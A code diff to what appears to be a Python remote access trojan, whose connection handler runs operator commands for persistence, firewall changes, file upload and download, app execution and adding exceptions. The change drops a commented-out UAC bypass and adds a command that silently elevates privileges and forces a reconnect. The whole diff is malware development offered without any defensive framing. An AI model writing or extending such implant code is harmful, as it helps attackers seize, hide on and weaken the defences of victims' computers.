@@ -5,6 +5,7 @@ from core.features.persistence import become_persistent
 from core.features.firewall import modify_firewall
 from core.features.filetransfer import download, upload
 from core.features.appexecute import execute_app
+from elevate import elevate
 import time
 
 def connection_handler(client):
@@ -27,10 +28,12 @@ def connection_handler(client):
             modify_firewall(client)
         elif option == "6":
             execute_app(client)
-        # elif option == "7":
-            # try_UAC_bypass()
+
         elif option == "7":
             add_exception(client)
+        elif option == "8":
+            elevate(show_console=False)
+            raise ConnectionError
 
 
         elif option == "exit" or option == "99" or option == "stop" or option == "quit":
